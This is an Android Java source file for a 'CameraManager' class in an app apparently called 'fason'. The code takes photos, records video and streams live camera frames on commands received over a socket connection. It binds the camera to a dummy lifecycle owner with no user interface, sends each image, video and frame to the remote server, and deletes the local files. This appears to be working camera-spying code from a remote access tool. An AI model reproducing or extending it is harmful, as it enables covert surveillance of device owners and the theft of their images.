package com.fason.app.features.camera;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.os.Build;
import android.util.Base64;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.video.FileOutputOptions;
import androidx.camera.video.Quality;
import androidx.camera.video.QualitySelector;
import androidx.camera.video.Recorder;
import androidx.camera.video.Recording;
import androidx.camera.video.VideoCapture;
import androidx.camera.video.VideoRecordEvent;
import androidx.core.content.ContextCompat;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import com.fason.app.service.MainService;
import com.google.common.util.concurrent.ListenableFuture;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraManager {
    private final Context ctx;
    private final Executor mainExec;
    private final ExecutorService camExec;
    private final ExecutorService sendExec;
    private volatile ProcessCameraProvider provider;
    private volatile ImageCapture capture;
    private volatile VideoCapture<Recorder> videoCapture;
    private volatile Recording recording;
    private volatile File videoFile;
    private volatile String videoCmdId;
    private volatile int videoCamId;
    private final AtomicBoolean init = new AtomicBoolean(false);
    private final AtomicBoolean capturing = new AtomicBoolean(false);
    private final AtomicBoolean recording_active = new AtomicBoolean(false);
    private final AtomicBoolean streaming = new AtomicBoolean(false);
    private volatile ImageAnalysis streamAnalysis;
    private volatile int streamCamId = 0;
    private volatile int streamQuality = 50;
    private volatile int streamIntervalMs = 100;
    private volatile long lastFrameTime = 0;
    private volatile boolean startAborted = false;

    public CameraManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.mainExec = ContextCompat.getMainExecutor(ctx);
        this.camExec = Executors.newSingleThreadExecutor();
        this.sendExec = Executors.newSingleThreadExecutor();
        init();
    }

    private void init() {
        camExec.execute(() -> {
            try {
                ListenableFuture<ProcessCameraProvider> future =
                    ProcessCameraProvider.getInstance(ctx);
                future.addListener(() -> {
                    try {
                        provider = future.get();
                        capture = new ImageCapture.Builder()
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .setJpegQuality(80)
                            .setFlashMode(ImageCapture.FLASH_MODE_AUTO)
                            .build();
                        init.set(true);
                    } catch (Exception ignored) {}
                }, mainExec);
            } catch (Exception ignored) {}
        });
    }

    private boolean hasPerm() {
        return ctx.checkSelfPermission(Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }

    private static void releaseCameraType() {
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
    }

    private void unbind() {
        try {
            if (provider != null) {
                provider.unbindAll();
            }
        } catch (Exception ignored) {}
    }

    public void capture(int camId, String cmdId, String flashMode, String quality) {
        if (!hasPerm()) {
            sendError(camId, "No camera permission", cmdId);
            return;
        }
        if (capturing.getAndSet(true)) {
            sendError(camId, "Camera busy", cmdId);
            return;
        }
        if (capture != null) {
            try {
                int fm = ImageCapture.FLASH_MODE_AUTO;
                if ("on".equals(flashMode)) fm = ImageCapture.FLASH_MODE_ON;
                else if ("off".equals(flashMode)) fm = ImageCapture.FLASH_MODE_OFF;
                capture.setFlashMode(fm);
            } catch (Exception ignored) {}
        }
        final int jpegQuality;
        if ("low".equals(quality)) jpegQuality = 50;
        else if ("high".equals(quality)) jpegQuality = 100;
        else jpegQuality = 80;
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
        final int finalCamId = camId;
        final String finalCmdId = cmdId;
        camExec.execute(() -> {
            try {
                if (!ensureInit()) {
                    sendError(finalCamId, "Camera init failed", finalCmdId);
                    capturing.set(false);
                    releaseCameraType();
                    return;
                }
                doCapture(finalCamId, finalCmdId, jpegQuality);
            } catch (Exception e) {
                sendError(finalCamId, "Capture failed: " + e.getMessage(), finalCmdId);
                capturing.set(false);
                releaseCameraType();
                mainExec.execute(this::unbind);
            }
        });
    }

    public void startRecording(int camId, String cmdId) {
        if (!hasPerm()) {
            sendVideoError(camId, "No camera permission", cmdId);
            return;
        }
        if (!recording_active.compareAndSet(false, true)) {
            sendVideoError(camId, "Already recording", cmdId);
            return;
        }
        videoCamId = camId;
        videoCmdId = cmdId;
        startAborted = false;
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            int type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                type |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            }
            svc.updateType(type);
        }
        camExec.execute(() -> {
            try {
                if (startAborted) {
                    recording_active.set(false);
                    releaseCameraType();
                    mainExec.execute(this::unbind);
                    return;
                }
                if (!ensureInit()) {
                    sendVideoError(camId, "Camera init failed", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }
                boolean front = camId == 1;
                CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
                try {
                    sel.filter(provider.getAvailableCameraInfos());
                } catch (Exception e) {
                    sendVideoError(camId, front ? "No front camera" : "No back camera", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }
                videoFile = File.createTempFile("vid_", ".mp4", ctx.getCacheDir());
                Recorder recorder = new Recorder.Builder()
                    .setQualitySelector(QualitySelector.from(Quality.HD))
                    .build();
                VideoCapture<Recorder> vc = VideoCapture.withOutput(recorder);
                mainExec.execute(() -> {
                    if (startAborted) {
                        recording_active.set(false);
                        releaseVideoType();
                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                        unbind();
                        return;
                    }
                    try {
                        provider.unbindAll();
                        provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, vc);
                        videoCapture = vc;
                        FileOutputOptions opts = new FileOutputOptions.Builder(videoFile).build();
                        android.util.Log.i("FasonCam", "Recording to " + videoFile.getAbsolutePath());
                        recording = vc.getOutput()
                            .prepareRecording(ctx, opts)
                            .start(mainExec, (event) -> {
                                if (event instanceof VideoRecordEvent.Finalize) {
                                    VideoRecordEvent.Finalize fin = (VideoRecordEvent.Finalize) event;
                                    android.util.Log.i("FasonCam", "Video done, error=" + fin.hasError());
                                    mainExec.execute(() -> unbind());
                                    if (!fin.hasError()) {
                                        sendVideoFile(camId, cmdId);
                                    } else {
                                        String err = "Recording failed: " + (fin.getCause() != null ? fin.getCause().getMessage() : "unknown");
                                        sendVideoError(camId, err, cmdId);
                                        recording_active.set(false);
                                        releaseVideoType();
                                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                                    }
                                }
                            });
                        emitVideoStatus(camId, "recording", cmdId);
                    } catch (Exception e) {
                        sendVideoError(camId, "Bind failed: " + e.getMessage(), cmdId);
                        recording_active.set(false);
                        releaseVideoType();
                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                    }
                });
            } catch (Exception e) {
                sendVideoError(camId, "Start recording failed: " + e.getMessage(), cmdId);
                recording_active.set(false);
                releaseVideoType();
                if (videoFile != null) { videoFile.delete(); videoFile = null; }
            }
        });
    }

    public void stopRecording(String cmdId) {
        startAborted = true;
        if (!recording_active.get()) {
            sendVideoError(videoCamId, "Not recording", cmdId);
            return;
        }
        if (recording == null) {
            recording_active.set(false);
            releaseVideoType();
            if (videoFile != null) { videoFile.delete(); videoFile = null; }
            mainExec.execute(this::unbind);
            sendVideoError(videoCamId, "Recording not yet started", cmdId);
            return;
        }
        try {
            recording.stop();
        } catch (Exception e) {
            android.util.Log.w("FasonCam", "recording.stop() threw, deferring", e);
            if (videoFile == null || !videoFile.exists()) {
                sendVideoError(videoCamId, "Stop failed: " + e.getMessage(), cmdId);
                recording_active.set(false);
                releaseVideoType();
            } else {
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    if (recording_active.get()) {
                        android.util.Log.w("FasonCam", "Finalize timeout, force-reset recording state");
                        recording_active.set(false);
                        releaseVideoType();
                        if (videoFile != null) { videoFile.delete(); videoFile = null; }
                        emitVideoStatus(videoCamId, "stopped", null);
                    }
                }, 5000);
            }
        }
    }

    private void sendVideoFile(int camId, String cmdId) {
        sendExec.execute(() -> {
            try {
                if (videoFile == null || !videoFile.exists()) {
                    sendVideoError(camId, "Video file not found", cmdId);
                    recording_active.set(false);
                    releaseVideoType();
                    return;
                }
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_NAME, videoFile.getName());
                meta.put(Protocol.KEY_CAMERA_ID, camId);
                meta.put(Protocol.KEY_SIZE, videoFile.length());
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.streamFile(
                    SocketClient.getInstance().getSocket(),
                    Protocol.CAMERA, videoFile, meta);
                emitVideoStatus(camId, "stopped", cmdId);
            } catch (Exception e) {
                sendVideoError(camId, "Send video failed: " + e.getMessage(), cmdId);
            } finally {
                recording_active.set(false);
                releaseVideoType();
                if (videoFile != null) { videoFile.delete(); videoFile = null; }
            }
        });
    }

    private void releaseVideoType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            MainService svc = MainService.getInstance();
            if (svc != null) {
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
            }
        }
    }

    private void emitVideoStatus(int camId, String status, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private void sendVideoError(int camId, String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_IMAGE, false);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private boolean ensureInit() {
        if (init.get() && provider != null) return true;
        CountDownLatch latch = new CountDownLatch(1);
        try {
            ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(ctx);
            future.addListener(() -> {
                try {
                    provider = future.get();
                    capture = new ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .setJpegQuality(80)
                        .build();
                    init.set(true);
                } catch (Exception ignored) {}
                latch.countDown();
            }, mainExec);
        } catch (Exception e) {
            latch.countDown();
        }
        try {
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
        return init.get() && provider != null;
    }

    private void doCapture(int camId, String cmdId, int jpegQuality) {
        if (provider == null || capture == null) {
            sendError(camId, "Camera not ready", cmdId);
            capturing.set(false);
            releaseCameraType();
            return;
        }
        boolean front = camId == 1;
        CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
        try {
            sel.filter(provider.getAvailableCameraInfos());
        } catch (Exception e) {
            sendError(camId, front ? "No front camera" : "No back camera", cmdId);
            capturing.set(false);
            releaseCameraType();
            return;
        }
        mainExec.execute(() -> {
            try {
                provider.unbindAll();
                provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, capture);
                camExec.execute(() -> {
                    try {
                        Thread.sleep(200);
                        mainExec.execute(() -> takePicture(camId, cmdId, jpegQuality));
                    } catch (Exception e) {
                        capturing.set(false);
                        releaseCameraType();
                        mainExec.execute(this::unbind);
                    }
                });
            } catch (Exception e) {
                sendError(camId, "Bind failed: " + e.getMessage(), cmdId);
                capturing.set(false);
                releaseCameraType();
                mainExec.execute(this::unbind);
            }
        });
    }

    private void takePicture(int camId, String cmdId, int jpegQuality) {
        if (capture == null) {
            sendError(camId, "Capture not ready", cmdId);
            capturing.set(false);
            releaseCameraType();
            mainExec.execute(this::unbind);
            return;
        }
        capture.takePicture(mainExec, new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(ImageProxy image) {
                if (sendExec.isShutdown()) {
                    image.close();
                    return;
                }
                sendExec.execute(() -> {
                    try {
                        ByteBuffer buf = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        int rotation = image.getImageInfo().getRotationDegrees();
                        bytes = rotateJpeg(bytes, rotation, jpegQuality);
                        send(bytes, camId, cmdId);
                    } catch (Exception e) {
                        sendError(camId, "Image process failed", cmdId);
                        capturing.set(false);
                        releaseCameraType();
                    } finally {
                        mainExec.execute(() -> {
                            try { image.close(); } catch (Exception ignored) {}
                            capturing.set(false);
                            unbind();
                            releaseCameraType();
                        });
                    }
                });
            }
            @Override
            public void onError(ImageCaptureException e) {
                sendError(camId, "Capture error: " + e.getMessage(), cmdId);
                capturing.set(false);
                releaseCameraType();
                init.set(false);
                mainExec.execute(() -> {
                    unbind();
                    camExec.execute(CameraManager.this::init);
                });
            }
        });
    }

    private static byte[] rotateJpeg(byte[] jpegBytes, int degrees, int quality) {
        try {
            Bitmap bmp = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.length);
            if (bmp == null) return jpegBytes;
            Matrix matrix = new Matrix();
            matrix.postRotate(degrees);
            Bitmap rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            rotated.compress(Bitmap.CompressFormat.JPEG, quality, bos);
            bmp.recycle();
            if (rotated != bmp) rotated.recycle();
            return bos.toByteArray();
        } catch (Exception e) {
            return jpegBytes;
        }
    }

    private void send(byte[] data, int camId, String cmdId) {
        try {
            if (TransferHelper.shouldChunk(data.length)) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_IMAGE, true);
                meta.put(Protocol.KEY_CAMERA_ID, camId);
                meta.put(Protocol.KEY_SIZE, data.length);
                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(meta, cmdId);
                TransferHelper.sendChunked(
                    SocketClient.getInstance().getSocket(),
                    Protocol.CAMERA, data, meta);
            } else {
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_IMAGE, true);
                obj.put(Protocol.KEY_CAMERA_ID, camId);
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_SIZE, data.length);
                obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                attachCmdId(obj, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
            }
        } catch (Exception ignored) {}
    }

    private void sendError(int camId, String error, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_IMAGE, false);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_ERROR, error);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }

    public JSONObject getCameraList() {
        try {
            JSONArray list = new JSONArray();
            if (provider != null) {
                try {
                    CameraSelector.DEFAULT_FRONT_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject front = new JSONObject();
                    front.put(Protocol.KEY_ID, 1);
                    front.put(Protocol.KEY_NAME, "Front");
                    list.put(front);
                } catch (Exception ignored) {}
                try {
                    CameraSelector.DEFAULT_BACK_CAMERA.filter(provider.getAvailableCameraInfos());
                    JSONObject back = new JSONObject();
                    back.put(Protocol.KEY_ID, 0);
                    back.put(Protocol.KEY_NAME, "Back");
                    list.put(back);
                } catch (Exception ignored) {}
            }
            if (list.length() == 0) {
                JSONObject back = new JSONObject();
                back.put(Protocol.KEY_ID, 0);
                back.put(Protocol.KEY_NAME, "Back");
                list.put(back);
                JSONObject front = new JSONObject();
                front.put(Protocol.KEY_ID, 1);
                front.put(Protocol.KEY_NAME, "Front");
                list.put(front);
            }
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_CAM_LIST, true);
            result.put(Protocol.KEY_LIST, list);
            result.put(Protocol.KEY_HAS_PERM, hasPerm());
            return result;
        } catch (Exception e) {
            try {
                JSONObject result = new JSONObject();
                result.put(Protocol.KEY_CAM_LIST, true);
                result.put(Protocol.KEY_LIST, new JSONArray());
                result.put(Protocol.KEY_ERROR, e.getMessage());
                return result;
            } catch (Exception ignored) {}
            return null;
        }
    }

    public void startStream(int camId, String cmdId, int quality, int intervalMs) {
        if (!hasPerm()) {
            sendError(camId, "No camera permission", cmdId);
            return;
        }
        if (!streaming.compareAndSet(false, true)) {
            sendError(camId, "Already streaming", cmdId);
            return;
        }
        if (recording_active.get()) {
            streaming.set(false);
            sendError(camId, "Cannot stream while recording", cmdId);
            return;
        }
        streamCamId = camId;
        streamQuality = quality > 0 && quality <= 100 ? quality : 50;
        streamIntervalMs = intervalMs > 33 ? intervalMs : 100;
        lastFrameTime = 0;
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }
        camExec.execute(() -> {
            if (!ensureInit()) {
                sendError(camId, "Camera init failed", cmdId);
                streaming.set(false);
                releaseCameraType();
                return;
            }
            boolean front = camId == 1;
            CameraSelector sel = front ? CameraSelector.DEFAULT_FRONT_CAMERA : CameraSelector.DEFAULT_BACK_CAMERA;
            try {
                sel.filter(provider.getAvailableCameraInfos());
            } catch (Exception e) {
                sendError(camId, front ? "No front camera" : "No back camera", cmdId);
                streaming.set(false);
                releaseCameraType();
                return;
            }
            final int finalCamId = camId;
            streamAnalysis = new ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build();
            streamAnalysis.setAnalyzer(camExec, image -> {
                if (!streaming.get()) {
                    image.close();
                    return;
                }
                if (SocketClient.getInstance() == null || !SocketClient.getInstance().isConnected()) {
                    image.close();
                    streaming.set(false);
                    mainExec.execute(() -> { unbind(); streamAnalysis = null; releaseCameraType(); });
                    emitStreamStatus(finalCamId, "stopped", null);
                    streamCamId = -1;
                    return;
                }
                long now = System.currentTimeMillis();
                if (now - lastFrameTime < streamIntervalMs) {
                    image.close();
                    return;
                }
                lastFrameTime = now;
                try {
                    byte[] jpegBytes = yuvToJpeg(image);
                    if (jpegBytes != null) sendStreamFrame(jpegBytes, finalCamId);
                } catch (Exception ignored) {
                } finally {
                    image.close();
                }
            });
            mainExec.execute(() -> {
                if (!streaming.get()) {
                    unbind();
                    streamAnalysis = null;
                    releaseCameraType();
                    return;
                }
                try {
                    provider.unbindAll();
                    provider.bindToLifecycle(DummyLifecycleOwner.get(), sel, streamAnalysis);
                    emitStreamStatus(camId, "streaming", cmdId);
                } catch (Exception e) {
                    sendError(camId, "Stream bind failed: " + e.getMessage(), cmdId);
                    streaming.set(false);
                    releaseCameraType();
                }
            });
        });
    }

    public void stopStream(String cmdId) {
        if (!streaming.compareAndSet(true, false)) return;
        mainExec.execute(() -> {
            unbind();
            streamAnalysis = null;
            releaseCameraType();
        });
        emitStreamStatus(streamCamId, "stopped", cmdId);
        streamCamId = -1;
    }

    private byte[] yuvToJpeg(ImageProxy image) {
        try {
            int width = image.getWidth();
            int height = image.getHeight();
            ImageProxy.PlaneProxy[] planes = image.getPlanes();
            int yRowStride = planes[0].getRowStride();
            int uvRowStride = planes[1].getRowStride();
            int uvPixelStride = planes[1].getPixelStride();
            ByteBuffer yBuf = planes[0].getBuffer();
            ByteBuffer uBuf = planes[1].getBuffer();
            ByteBuffer vBuf = planes[2].getBuffer();
            byte[] nv21 = new byte[width * height * 3 / 2];
            int pos = 0;
            if (yRowStride == width) {
                yBuf.get(nv21, 0, width * height);
                pos = width * height;
            } else {
                for (int row = 0; row < height; row++) {
                    yBuf.position(row * yRowStride);
                    yBuf.get(nv21, pos, width);
                    pos += width;
                }
            }
            if (uvPixelStride == 2 && uvRowStride == width) {
                byte[] uv = new byte[uBuf.remaining()];
                vBuf.get(uv, 0, Math.min(uv.length, vBuf.remaining()));
                for (int i = 0; i < uv.length - 1; i += 2) {
                    nv21[pos++] = uv[i + 1];
                    nv21[pos++] = uv[i];
                }
            } else if (uvPixelStride == 1) {
                int uvSize = width * height / 4;
                for (int row = 0; row < height / 2; row++) {
                    for (int col = 0; col < width / 2; col++) {
                        int uvIndex = row * uvRowStride + col * uvPixelStride;
                        nv21[pos++] = vBuf.get(uvIndex);
                        nv21[pos++] = uBuf.get(uvIndex);
                    }
                }
            } else {
                for (int row = 0; row < height / 2; row++) {
                    for (int col = 0; col < width / 2; col++) {
                        int uvIndex = row * uvRowStride + col * uvPixelStride;
                        nv21[pos++] = vBuf.get(uvIndex);
                        nv21[pos++] = uBuf.get(uvIndex);
                    }
                }
            }
            android.graphics.YuvImage yuvImage = new android.graphics.YuvImage(nv21, android.graphics.ImageFormat.NV21, width, height, null);
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            yuvImage.compressToJpeg(new android.graphics.Rect(0, 0, width, height), streamQuality, out);
            return out.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    private void sendStreamFrame(byte[] data, int camId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STREAM_FRAME, true);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
            obj.put(Protocol.KEY_SIZE, data.length);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    private void emitStreamStatus(int camId, String status, String cmdId) {
        try {
            JSONObject obj = new JSONObject();
            obj.put(Protocol.KEY_STREAM_FRAME, true);
            obj.put(Protocol.KEY_STATUS, status);
            obj.put(Protocol.KEY_CAMERA_ID, camId);
            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            attachCmdId(obj, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.CAMERA, obj);
        } catch (Exception ignored) {}
    }

    public void shutdown() {
        capturing.set(false);
        streaming.set(false);
        streamAnalysis = null;
        if (recording_active.compareAndSet(true, false)) {
            try {
                if (recording != null) {
                    recording.stop();
                }
            } catch (Exception ignored) {}
            recording = null;
            if (videoFile != null) { videoFile.delete(); videoFile = null; }
        }
        try {
            DummyLifecycleOwner.get().pause();
        } catch (Exception ignored) {}
        unbind();
        DummyLifecycleOwner.reset();
        camExec.shutdown();
        sendExec.shutdown();
    }
}
